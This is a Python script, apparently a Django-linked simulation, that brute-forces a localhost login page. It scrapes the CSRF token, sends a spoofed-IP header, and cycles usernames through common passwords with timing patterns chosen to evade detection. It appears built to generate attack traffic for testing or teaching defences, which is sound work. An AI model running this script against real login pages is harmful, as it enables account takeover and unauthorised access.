import random
import time

import requests
from django.core.cache import cache
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup


disable_warnings(InsecureRequestWarning)

LOGIN_URL = "https://localhost/login"

fake_ip = "123.45.67.89"

session = requests.Session()

# Disable cert verification ONLY for testing environments
session.verify = False

# 1. GET login page to receive CSRF + cookies
resp = session.get(LOGIN_URL)
soup = BeautifulSoup(resp.text, "html.parser")

csrf = soup.find("input", id="csrf_token")["value"]

# 2. Now POST login data with CSRF + cookies

headers = {
    "X-Spoofed-IP": fake_ip,
    "User-Agent": "Mozilla/5.0",
    "Referer": LOGIN_URL,
}

attack_patterns = {
    "slow": lambda: random.uniform(2, 5),      # Stealthy
    "medium": lambda: random.uniform(0.5, 2),  # Normal bot
    "fast": lambda: random.uniform(0.1, 0.5),  # Aggressive
    "burst": lambda: random.choice([0.1, 0.1, 0.1, 5])  # Bursts then pause
}

USERS = ["keyunited", "chivalrousget", "tortoiseblock", "inventlearning", "blushnegative", "test"]

COMMON_PASSWORDS = [
    "password123", "Password1!", "admin", "12345678",
    "qwerty", "letmein", "welcome", "monkey123", "test"
]



def start_brute_force_simulation(session_key, start_key, pattern="medium"):
    stop_key = f"stop_logs_{session_key}"

    delay_func = attack_patterns.get(pattern, attack_patterns["medium"])

    success = 0

    print("Starting brute force attack")
    for user in USERS:
        if cache.get(stop_key) and cache.get(start_key):
            break

        user = user
        token = csrf

        for password in COMMON_PASSWORDS:
            payload = {
                "username": user,
                "password": password,
                "csrf_token": token,
            }

            r = session.post(LOGIN_URL, data=payload, headers=headers, allow_redirects=True, verify=False)

            if r.status_code in (200, 302) and "dashboard" in r.url:
                print(f"SUCCESS! {user}:{password}")
                success += 1
                break

            time.sleep(delay_func())

    if success == 0:
        print("BRUTE FORCE ATTEMPT FAILED")

    session.close()
    cache.delete(start_key)
    print("Stopped brute force attack")


